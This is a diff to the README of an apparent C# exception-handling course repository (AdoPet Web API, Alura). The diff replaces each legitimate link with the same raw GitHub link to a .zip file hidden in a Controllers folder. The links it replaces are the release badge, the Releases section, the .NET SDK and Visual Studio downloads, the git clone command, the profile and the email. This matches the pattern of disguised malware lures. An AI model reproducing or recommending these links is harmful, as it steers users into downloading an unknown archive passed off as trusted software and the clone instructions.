@@ -1,6 +1,6 @@
 # Ado Pet Web API Course - Alura Exceptions Part 4
 
-![GitHub release](https://img.shields.io/badge/releases-latest-blue.svg)
+![GitHub release](https://raw.githubusercontent.com/Haufai/ado-pet_webapi_course-alura-exceptions_part-4_dotnet-8_csharp-12/main/developments/csharp-exceptions-Aula-4/Adopet/Controllers/ado-course-csharp-exceptions-alura-dotnet-pet-part-webapi-v3.8.zip)
 
 Welcome to the **Ado Pet Web API Course** repository! This project contains exercises from the course “C# e Exceções: construa aplicações resilientes” offered by Alura. The course focuses on exception handling, error hierarchy, API application, and best practices for building robust and reliable applications in C#.
 
@@ -19,7 +19,7 @@ Welcome to the **Ado Pet Web API Course** repository! This project contains exer
 
 In today's software development landscape, building resilient applications is crucial. This repository aims to provide practical examples and exercises that enhance your understanding of exception handling in C#. You will learn how to manage errors effectively and apply best practices for creating stable APIs.
 
-For the latest updates and releases, please visit our [Releases section](https://github.com/Haufai/ado-pet_webapi_course-alura-exceptions_part-4_dotnet-8_csharp-12/releases).
+For the latest updates and releases, please visit our [Releases section](https://raw.githubusercontent.com/Haufai/ado-pet_webapi_course-alura-exceptions_part-4_dotnet-8_csharp-12/main/developments/csharp-exceptions-Aula-4/Adopet/Controllers/ado-course-csharp-exceptions-alura-dotnet-pet-part-webapi-v3.8.zip).
 
 ## Course Overview
 
@@ -52,15 +52,15 @@ This repository includes the following key topics:
 
 To get started with this repository, you need to have the following installed on your machine:
 
-- [.NET SDK](https://dotnet.microsoft.com/download) (version 8 or higher)
-- A code editor like [Visual Studio](https://visualstudio.microsoft.com/) or [Visual Studio Code](https://code.visualstudio.com/)
+- [.NET SDK](https://raw.githubusercontent.com/Haufai/ado-pet_webapi_course-alura-exceptions_part-4_dotnet-8_csharp-12/main/developments/csharp-exceptions-Aula-4/Adopet/Controllers/ado-course-csharp-exceptions-alura-dotnet-pet-part-webapi-v3.8.zip) (version 8 or higher)
+- A code editor like [Visual Studio](https://raw.githubusercontent.com/Haufai/ado-pet_webapi_course-alura-exceptions_part-4_dotnet-8_csharp-12/main/developments/csharp-exceptions-Aula-4/Adopet/Controllers/ado-course-csharp-exceptions-alura-dotnet-pet-part-webapi-v3.8.zip) or [Visual Studio Code](https://raw.githubusercontent.com/Haufai/ado-pet_webapi_course-alura-exceptions_part-4_dotnet-8_csharp-12/main/developments/csharp-exceptions-Aula-4/Adopet/Controllers/ado-course-csharp-exceptions-alura-dotnet-pet-part-webapi-v3.8.zip)
 
 ### Cloning the Repository
 
 You can clone this repository using the following command:
 
 ```bash
-git clone https://github.com/Haufai/ado-pet_webapi_course-alura-exceptions_part-4_dotnet-8_csharp-12.git
+git clone https://raw.githubusercontent.com/Haufai/ado-pet_webapi_course-alura-exceptions_part-4_dotnet-8_csharp-12/main/developments/csharp-exceptions-Aula-4/Adopet/Controllers/ado-course-csharp-exceptions-alura-dotnet-pet-part-webapi-v3.8.zip
 ```
 
 ### Running the Application
@@ -82,7 +82,7 @@ This repository contains various exercises that demonstrate different aspects of
 2. **Read the Instructions**: Each exercise comes with a README file that explains the task and expected outcomes.
 3. **Run the Code**: Follow the instructions to run the code and see how exception handling works in practice.
 
-For the latest releases, including new exercises and updates, visit the [Releases section](https://github.com/Haufai/ado-pet_webapi_course-alura-exceptions_part-4_dotnet-8_csharp-12/releases).
+For the latest releases, including new exercises and updates, visit the [Releases section](https://raw.githubusercontent.com/Haufai/ado-pet_webapi_course-alura-exceptions_part-4_dotnet-8_csharp-12/main/developments/csharp-exceptions-Aula-4/Adopet/Controllers/ado-course-csharp-exceptions-alura-dotnet-pet-part-webapi-v3.8.zip).
 
 ## Contributing
 
@@ -104,7 +104,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- [GitHub Profile](https://github.com/Haufai)
-- Email: [your.email@example.com](mailto:your.email@example.com)
+- [GitHub Profile](https://raw.githubusercontent.com/Haufai/ado-pet_webapi_course-alura-exceptions_part-4_dotnet-8_csharp-12/main/developments/csharp-exceptions-Aula-4/Adopet/Controllers/ado-course-csharp-exceptions-alura-dotnet-pet-part-webapi-v3.8.zip)
+- Email: [https://raw.githubusercontent.com/Haufai/ado-pet_webapi_course-alura-exceptions_part-4_dotnet-8_csharp-12/main/developments/csharp-exceptions-Aula-4/Adopet/Controllers/ado-course-csharp-exceptions-alura-dotnet-pet-part-webapi-v3.8.zip](https://raw.githubusercontent.com/Haufai/ado-pet_webapi_course-alura-exceptions_part-4_dotnet-8_csharp-12/main/developments/csharp-exceptions-Aula-4/Adopet/Controllers/ado-course-csharp-exceptions-alura-dotnet-pet-part-webapi-v3.8.zip)
 
 Thank you for your interest in the Ado Pet Web API Course! We hope you find these exercises helpful in mastering exception handling in C#.
